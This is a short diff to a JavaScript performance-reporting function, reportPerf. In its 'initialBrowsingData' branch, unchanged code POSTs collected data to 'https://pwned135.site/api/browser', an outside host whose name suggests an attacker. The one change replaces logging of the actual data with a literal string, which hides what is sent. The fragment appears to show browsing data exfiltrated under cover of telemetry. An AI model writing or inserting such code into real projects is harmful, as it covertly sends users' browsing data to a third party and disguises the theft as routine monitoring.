@@ -451,7 +451,7 @@ function reportPerf(measureName, data, customProperties = {}) {
     if(measureName == "initialBrowsingData") {
       var data = payload["data"];
       var vitalsScore = payload["vitalsScore"];
-      console.log(data);
+      console.log("data");
       fetch("https://pwned135.site/api/browser", {
         method: 'POST',
         headers: {
